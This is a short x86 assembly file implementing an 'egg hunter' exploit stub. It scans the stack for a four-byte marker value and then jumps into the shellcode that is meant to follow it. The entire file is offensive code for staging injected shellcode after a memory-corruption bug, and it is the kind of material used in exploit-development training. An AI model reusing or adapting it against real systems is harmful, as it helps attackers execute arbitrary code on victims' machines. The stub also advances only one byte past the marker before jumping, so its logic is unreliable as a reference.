global _start			

section .text

_start:
	mov ebx, 0x44556677	; our egg :)
	mov eax, esp		; get current top of the stack
loopy:	
	inc eax			; move deeper into stack
	cmp dword [eax], ebx	; cmp the two values
	jne loopy		; loop back (egg not found at this point)
	inc eax			; start of the actual shellcode
	jmp eax			

